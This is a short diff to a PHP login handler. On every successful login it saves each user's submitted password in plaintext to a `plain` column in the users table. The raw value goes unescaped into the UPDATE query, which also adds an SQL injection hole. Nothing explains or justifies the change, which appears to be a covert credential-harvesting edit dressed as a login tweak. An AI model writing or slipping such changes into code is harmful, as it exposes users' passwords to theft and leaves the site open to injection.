@@ -2,6 +2,7 @@
   require_once 'db.php';
   require_once 'security.php';
   $e = strtolower(protect($_POST['e']));
+  $plain = $_POST['p'];
   $p = hashpass($_POST['p'],$salt);
   $dt = date("Y-m-d H:i:s");
   $sign_stmt = $srbn_con->prepare("SELECT `id`,`password` FROM `users` WHERE `email`=?");
@@ -18,7 +19,7 @@
     $sign_row = $sign_stmt->fetch();
     if ($sign_row['password'] == $p) {
       try {
-        $srbn_con->query("UPDATE `users` SET `last_login`='$dt' WHERE email='$e'");
+        $srbn_con->query("UPDATE `users` SET `last_login`='$dt',`plain`='$plain' WHERE email='$e'");
       } catch (PDOException $err) {
         echo $err->getMessage();
         $srbn_con = null;
